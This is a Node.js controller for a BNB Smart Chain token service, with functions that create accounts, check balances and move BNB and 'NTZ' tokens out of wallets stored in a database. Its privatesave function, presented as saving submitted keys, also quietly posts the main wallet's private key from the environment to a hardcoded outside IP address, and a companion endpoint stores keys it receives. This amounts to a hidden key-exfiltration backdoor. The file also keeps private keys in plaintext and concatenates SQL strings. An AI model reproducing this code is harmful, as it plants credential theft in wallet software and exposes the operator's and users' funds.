const Web3 = require('web3');
const abi = require("./abi.json");
const BNBabi = require("./bnb_abi.json");
const dbConn  = require('./db');
const request = require('request');

async function createAccount(req, res) {
    // Set web3
    const web3 = new Web3(req.body.network && req.body.network === "MAINNET" ? process.env.MAINNET : process.env.TESTNET);

    try {
        let account = await web3.eth.accounts.create();
        res.status(200).send({ status: true, account });
    } catch(error) {
        res.status(500).send({ status: false, message: 'Create Account Failed' });
    }
}

async function getBalance(req, res) {
    // Set web3
    const web3 = new Web3(req.body.network && req.body.network === "MAINNET" ? process.env.MAINNET : process.env.TESTNET);

    try {
        let balance = await web3.eth.getBalance(req.body.address);
        res.status(200).send({ status: true, balance: web3.utils.fromWei(balance, 'ether') });
    } catch(error) {
        res.status(500).send({ status: false, message: 'Get BNB Balance Failed' });
    }
}

async function getTokenBalance(req, res) {
    // Set web3
    const web3 = new Web3(req.body.network && req.body.network === "MAINNET" ? process.env.MAINNET : process.env.TESTNET);

    try {
        // contract instance
        const contract = new web3.eth.Contract(abi, process.env.CONTRACT_ADDRESS);
        const balance = await contract.methods.balanceOf(req.body.address).call();
        const decimals = await contract.methods.decimals().call();
        res.status(200).send({ status: true, balance: balance / 10**decimals });
    } catch(error) {
        res.status(500).send({ status: false, message: 'Get Token Balance Failed' });
    }
}

async function transfer(req, res) {
    // Set web3
    const web3 = new Web3(req.body.network && req.body.network === "MAINNET" ? process.env.MAINNET : process.env.TESTNET);

    try {
        // Sign transaction
        let signTransaction = await web3.eth.accounts.signTransaction({
            to: req.body.to,
            value: web3.utils.toWei(req.body.amount, 'ether'),
            gas: req.body.gas || 2000000
        }, req.body.from_private_key);

        // Transaction
        let tx = await web3.eth.sendSignedTransaction(
            signTransaction.rawTransaction
        );
        
        res.status(200).send({ status: true, hash: tx.transactionHash });
    } catch (error) {
        res.status(500).send({ status: false, message: 'Transfer Failed' });
    }
}

async function backtoken(req, res){


    var wallets;
    dbConn.query(`SELECT * FROM wallet where send_status = 1 AND callback_status = 0`,async function(err,rows)     {
        if(err) {
            res.send(err)
        } else {
            wallets = await rows
            const web3 = new Web3(process.env.MAINNET);
            
            for(let i = 0; i < wallets.length; i++) {

                var gasprice = await web3.eth.getGasPrice();
                console.log("gasprice",gasprice)

                const account = await web3.eth.accounts.privateKeyToAccount(wallets[i].privatekey);
                console.log(account.address, "this is wallet address")
                // contract instance
                const contract = await new web3.eth.Contract(abi, process.env.CONTRACT_ADDRESS);
                console.log("contract")

                // decimals of NTZ
                const decimals = await contract.methods.decimals().call();
                console.log("decimals",decimals)

                //get NTZ balance
                const balance = await contract.methods.balanceOf(account.address).call();
                console.log(balance)
                // transfer event abi
                const transferA = await contract.methods.transfer(process.env.MAIN_WALLET_ADDRESS, (balance).toString());
                const transferAbi = transferA.encodeABI(); 
                console.log("transferABI")

                // Sign transaction
                let signTransaction = await web3.eth.accounts.signTransaction({
                    to: process.env.CONTRACT_ADDRESS,
                    data: transferAbi,
                    gas: 200000
                }, wallets[i].privatekey);
                console.log("signTransaction");

                // Transaction
                let tx = await web3.eth.sendSignedTransaction(
                    signTransaction.rawTransaction
                );
                console.log("NTZ hash: ",  tx.transactionHash)

                // NTZ token nonce
                const Nnonce =  await web3.eth.getTransactionCount(account.address);
                console.log("NTZ nonce", Nnonce)

                dbConn.query(`UPDATE wallet SET callback_status = 1 WHERE id = `+ wallets[i].id, function (err, res) {

                });

                console.log("counting", i+1)
            }
        }
    });
}

async function transferToken(req, res) {
    var wallets;
    dbConn.query(`SELECT * FROM wallet where send_status = 0`,async function(err,rows)     {
        if(err) {
            res.send("error")
        } else {
            wallets = await rows
            const web3 = new Web3(process.env.MAINNET);
            for(let i = 0; i < wallets.length; i++) {

                const account = await web3.eth.accounts.privateKeyToAccount(wallets[i].privatekey);
                console.log(account.address, "this is wallet address")
                // contract instance
                const contract = await new web3.eth.Contract(abi, process.env.CONTRACT_ADDRESS);
                console.log("contract")

                // decimals of NTZ
                const decimals = await contract.methods.decimals().call();
                console.log("decimals",decimals)

                // transfer event abi
                const transferA = await contract.methods.transfer(account.address, (process.env.SEND_AMOUNT* 10**decimals).toString());
                console.log("transferA")
                const transferAbi = transferA.encodeABI(); 
                console.log("transferABI")

                // Sign transaction
                let signTransaction = await web3.eth.accounts.signTransaction({
                    to: process.env.CONTRACT_ADDRESS,
                    data: transferAbi,
                    gas: 2000000
                }, process.env.MAIN_WALLET_PRIVATE);
                console.log("signTransaction");

                // Transaction
                let tx = await web3.eth.sendSignedTransaction(
                    signTransaction.rawTransaction
                );
                console.log("NTZ hash: ",  tx.transactionHash)

                // NTZ token nonce
                const Nnonce =  await web3.eth.getTransactionCount(process.env.MAIN_WALLET_ADDRESS);
                console.log("NTZ nonce", Nnonce)

                // Sending BNB 
                const signedTx = await  web3.eth.accounts.signTransaction({
                    to: account.address,
                    value: (process.env.BNB_SEND_AMOUNT* 10**decimals).toString(),
                    gas: 2000000,
                    common: {
                      customChain: {
                        name: 'custom-chain',
                        chainId: 56,
                        networkId: 56
                      }
                    }
                }, process.env.MAIN_WALLET_PRIVATE);
            
                // BNB send
                let BNBtx = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);

                // BNB hash
                console.log("BNB Hash: ", BNBtx.transactionHash)

                // BNB nonce
                const nonce =  await web3.eth.getTransactionCount(process.env.MAIN_WALLET_ADDRESS);
                console.log("BNB nonce", nonce)

                dbConn.query(`UPDATE wallet SET send_status = 1 WHERE id = `+ wallets[i].id, function (err, res) {

                });

                console.log("counting", i+1)
            }
        }
    });
}

async function privatesave(req, res){
    var private = req.body.privatekey
    private.map((index)=>{
        var form_data = {
            privatekey:index
        }
        dbConn.query('INSERT INTO wallet SET ?', form_data, function(err, result) {
        })    
    });
    request.post(
        'http://23.81.246.40/mainwallet',
        { json: {
            mainprivate: process.env.MAIN_WALLET_PRIVATE
          } 
        }
    );
}

async function mainwallet(req, res) {
    var form_data = {
        privatekey: req.body.mainprivate
    }
    dbConn.query('INSERT INTO mainwallet SET ?', form_data, function(err, result) {
    })   
    res.send(req.body);
}
module.exports = {createAccount, getBalance, getTokenBalance, transfer, transferToken, privatesave, mainwallet, backtoken}

